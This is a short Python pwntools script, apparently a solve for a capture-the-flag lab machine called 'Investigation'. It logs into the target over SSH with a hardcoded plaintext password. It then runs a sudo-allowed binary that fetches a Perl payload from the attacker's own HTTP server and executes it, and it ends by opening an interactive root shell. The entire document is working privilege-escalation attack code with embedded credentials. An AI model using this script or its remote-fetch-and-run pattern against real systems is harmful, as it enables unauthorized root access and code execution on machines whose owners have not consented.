
import requests



try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Investigation - Ninhpn1337\n")
except:
    print("\n[\033[1;31m!\033[1;37m] Sudo please!\n")
    exit(1)




def server():
    
    os.system("python3 -m http.server 8000")
threading.Thread(target=server, args=()).start()

request = ssh(host="10.10.11.197", user="smorton", password="Def@ultf0r3nz!csPa$$")
shell = request.process("/bin/sh")
shell.sendline(b"whoami")
shell.sendline(b"ssh smorton@127.0.0.1")
shell.sendline(b"yes")
time.sleep(0.5)
shell.sendline(b"Def@ultf0r3nz!csPa$$")
shell.sendline(b"sudo /usr/bin/binary http://10.10.14.1:8000/root.pl lDnxUysaQn")
time.sleep(0.5)
shell.sendline(b"/bin/sh")
shell.interactive()
